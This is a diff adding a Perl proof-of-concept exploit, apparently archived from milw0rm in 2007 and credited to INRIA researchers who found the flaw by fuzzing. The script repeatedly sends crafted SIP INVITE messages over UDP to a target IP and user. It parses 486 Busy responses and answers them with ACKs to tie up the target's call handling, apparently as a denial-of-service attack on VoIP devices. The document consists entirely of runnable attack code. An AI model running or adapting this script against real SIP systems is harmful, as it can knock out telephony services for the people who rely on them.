@@ -1,0 +1,89 @@
+#!/usr/bin/perl
+ 
+
+###############################
+# Vulnerabily discovered using KiF ~ Kiph
+#
+# Authors:
+# Humberto J. Abdelnur (Ph.D Student)
+# Radu State (Ph.D)
+# Olivier Festor (Ph.D)
+#
+# Madynes Team, LORIA - INRIA Lorraine
+# http://madynes.loria.fr
+############################### 
+use IO::Socket::INET;
+use String::Random; 
+die "Usage $0 <targetIP> <targetUser> <attackerIP> <attackerUser>"
+unless ($ARGV[3]); 
+$targetUser = $ARGV[1];
+$targetIP = $ARGV[0]; 
+$attackerUser = $ARGV[3];
+$attackerIP= $ARGV[2]; 
+$socket=new IO::Socket::INET->new(
+Proto=>'udp',
+PeerPort=>5060,
+PeerAddr=>$targetIP,
+LocalPort=>5060); 
+$foo = new String::Random; 
+$flag = 0;
+@calls;
+$threads = 0; 
+while ($flag == 0){
+$callid= " " . $foo->randpattern("CCCnccnC") ."\@$attackerIP";
+$cseq = $foo->randregex('\d\d\d\d'); 
+$msg = "INVITE sip:$targetIP SIP/2.0\r
+Via: SIP/2.0/UDP $attackerIP;branch=z9hG4bK1\r
+From: <sip:$attackerUser\@$attackerIP>;tag=1\r
+To: <sip:$targetUser\@$targetIP>\r
+Call-ID:$callid\r
+CSeq: $cseq INVITE\r
+Max-Forwards: 70\r
+Contact: <sip:$attackerUser\@$attackerIP>\r
+Allow: INVITE, ACK, CANCEL, BYE, OPTIONS, REFER, SUBSCRIBE, NOTIFY,
+MESSAGE\r
+Content-Length: 0\r
+\r
+";
+$socket->send($msg); 
+$socket->recv($text,1024,0);
+if ($text =~ /^SIP\/2.0 100(.\r\n)*/ ){
+push(@calls, $callid);
+sleep(1);
+}elsif ($text =~ /^SIP\/2.0 486(.\r\n)*/ ){
+if ($thread == 0){
+$thread = scalar(@calls);
+}
+while (scalar(@calls) ge $thread){
+$toTag = $cseq= $callid= $text;
+$toTag =~ s/^(.*\r\n)*(To|t):(.*?>)(;.*?)?\r\n(.*\r\n)*/\4/;
+
+$callid =~ s/^(.*\r\n)*Call-ID:(.*)\r\n(.*\r\n)*/\2/;
+$cseq =~ s/^(.*\r\n)*CSeq: (.*?) (.*?)\r\n(.*\r\n)*/\2/; 
+$msg = "ACK sip:$targetIP SIP/2.0\r
+Via: SIP/2.0/UDP $attackerIP;branch=z9hG4bK1\r
+From: <sip:$attackerUser\@$attackerIP>;tag=1\r
+To: <sip:$targetUser\@$targetIP>$toTag\r
+Call-ID:$callid\r
+CSeq: $cseq ACK\r
+Contact: <sip:$attackerUser\@$attackerIP>\r
+Content-Length: 0\r
+\r
+";
+$socket->send($msg);
+$i= 0;
+while ($i < scalar(@calls)){
+if (@calls[$i] eq $callid){
+delete @calls[$i];
+}else{
+$i += 1;
+}
+}
+if (scalar(@calls) ge $thread){
+$socket->recv($text,1024,0);
+}
+}
+}
+}
+
+# milw0rm.com [2007-12-05]
